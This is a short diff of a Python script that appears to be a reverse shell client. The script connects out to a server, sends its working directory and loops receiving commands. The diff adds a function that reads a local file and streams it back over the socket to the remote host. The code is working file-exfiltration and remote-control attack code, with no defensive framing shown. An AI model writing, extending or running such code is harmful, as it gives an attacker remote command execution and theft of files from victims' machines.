@@ -17,7 +17,13 @@ s.connect((SERVER_HOST, SERVER_PORT))
 
 cwd = os.getcwd()
 s.send(cwd.encode())
-
+def sendfile(filename):
+    with open(filename, 'rb') as f:
+        while True:
+            bytes_read = f.read(BUFFER_SIZE)
+            if not bytes_read:
+                break
+            s.sendall(bytes_read)
 while True:
     # receive the command from the server
     command = s.recv(BUFFER_SIZE).decode()
